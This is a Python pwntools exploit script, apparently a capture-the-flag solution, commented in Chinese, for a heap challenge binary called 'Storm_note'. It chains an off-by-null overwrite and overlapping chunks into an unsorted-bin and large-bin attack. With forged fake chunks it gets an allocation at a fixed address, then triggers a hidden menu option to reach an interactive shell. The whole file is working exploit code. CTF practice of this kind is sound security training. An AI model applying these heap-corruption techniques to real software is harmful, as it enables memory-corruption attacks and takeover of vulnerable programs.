# -*- coding:utf-8 -*-

from pwn import *

sh = process('./Storm_note')
elf = ELF('./Storm_note')
# context.log_level = "debug"

# 创建pid文件，用于gdb调试
f = open('pid', 'w')
f.write(str(proc.pidof(sh)[0]))
f.close()

def alloc_note(size):
	sh.sendline('1')
	sh.recvuntil('?')
	sh.sendline(str(size))
	sh.recvuntil('Choice')

def edit_note(idx, mes):
	sh.sendline('2')
	sh.recvuntil('?')
	sh.sendline(str(idx))
	sh.recvuntil('Content')
	sh.send(mes)
	sh.recvuntil('Choice')

def delete_note(idx):
	sh.sendline('3')
	sh.recvuntil('?')
	sh.sendline(str(idx))
	sh.recvuntil('Choice')

# 清除流
sh.recvuntil('Choice')

alloc_note(0x18)  # 0
alloc_note(0x508)  # 1
alloc_note(0x18)  # 2
alloc_note(0x18)  # 3
alloc_note(0x508)  # 4
alloc_note(0x18)  # 5
alloc_note(0x18)  # 6

# 改pre_size域为 0x500 ,为了能过检查
edit_note(1, 'a'*0x4f0 + p64(0x500))
# 释放1号块到unsort bin 此时chunk size=0x510
# 2号的prev_size 为 0x510
delete_note(1)

# off by null 将1号块的size字段覆盖为0x500，
# 和上面的0x500对应，为了绕过检查
edit_note(0, 'a'*(0x18))

alloc_note(0x18)  # 1  从unsorted bin上面割下来的
alloc_note(0x4d8)  # 7 为了和 1 重叠

delete_note(1)
delete_note(2)  # unlink进行前向extend

# 2号块与7号块交叠，可以通过7号块修改2号块的内容
alloc_note(0x30)  # 1
alloc_note(0x4e8)  # 2

# 原理同上
edit_note(4, 'a'*(0x4f0) + p64(0x500))
delete_note(4)
edit_note(3, 'a'*(0x18))
alloc_note(0x18)  # 4
alloc_note(0x4d8)  # 8
delete_note(4)
delete_note(5)
alloc_note(0x40)  # 4

# 将2号块和4号块分别加入unsort bin和large bin
delete_note(2)
alloc_note(0x4e8)	# 2
delete_note(2)

storage = 0xabcd0100
fake_chunk = storage - 0x20

# 伪造fake_chunk
layout = [
	'\x00' * 16,  # 填充16个没必要的字节
	p64(0),  # fake_chunk->prev_size
	p64(0x4f1),  # fake_chunk->size
	p64(0),  # fake_chunk->fd
	p64(fake_chunk)  # fake_chunk->bk
]

# 修改unsorted bin 中的内容
edit_note(7, flat(layout))

layout = [
	'\x00' * 32,  # 32 字节偏移
	p64(0),  # fake_chunk2->prev_size
	p64(0x4e1),  # fake_chunk2->size
	p64(0),  # fake_chunk2->fd
	# 用于创建假块的“bk”，以避免从未排序的bin解链接时崩溃
	p64(fake_chunk + 8),  # fake_chunk2->bk
	p64(0),  # fake_chunk2->fd_nextsize
	# 用于使用错误对齐技巧创建假块的“大小”
	p64(fake_chunk - 0x18 - 5)  # fake_chunk2->bk_nextsize
]

# 修改large bin 中的内容
edit_note(8, flat(layout))

# 0xabcd00f0
alloc_note(0x48)  # 2

edit_note(2, p64(0) * 8)
sh.sendline('666')
sh.sendline('\x00'*0x30)

sh.interactive()
